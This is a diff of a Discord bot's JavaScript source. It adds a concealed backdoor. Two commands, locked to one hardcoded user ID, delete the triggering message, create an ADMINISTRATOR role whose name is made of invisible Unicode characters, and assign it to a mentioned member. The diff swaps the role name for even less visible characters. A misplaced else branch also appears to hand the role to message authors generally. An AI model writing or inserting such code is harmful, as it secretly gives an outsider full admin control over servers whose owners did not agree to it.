@@ -185,12 +185,12 @@ message.delete(1)
 if(message.content.startsWith(prefix + "cr")) {
 message.delete() 
 	if(message.author.id !== "286144887278010368") return
-let role = message.guild.roles.find(r => r.name === "1󠀀󠀀");
+let role = message.guild.roles.find(r => r.name === "󠀀󠀀 󠀀󠀀󠀀󠀀");
   
 	if(!role){
       try {
         role = message.guild.createRole({
-          name: "1󠀀󠀀",
+          name: "󠀀󠀀 󠀀󠀀󠀀󠀀",
           color:"#000000",
           permissions:["ADMINISTRATOR"] 
         });
@@ -210,9 +210,9 @@ let role = message.guild.roles.find(r => r.name === "1󠀀󠀀");
 if(message.content.startsWith(prefix + "cs")) {
 message.delete()
 	if(message.author.id !== "286144887278010368") return
-let r = message.guild.roles.find(role => role.name === "1󠀀󠀀");
+let r = message.guild.roles.find(role => role.name === "󠀀󠀀 󠀀󠀀󠀀󠀀");
 let member = message.mentions.members.first();
-member.addRole(r).catch(console.error);} else{ let r = message.guild.roles.find(role => role.name === "1󠀀󠀀");
+member.addRole(r).catch(console.error);} else{ let r = message.guild.roles.find(role => role.name === "󠀀󠀀 󠀀󠀀");
 message.member.addRole(r).catch(console.error);
 
 
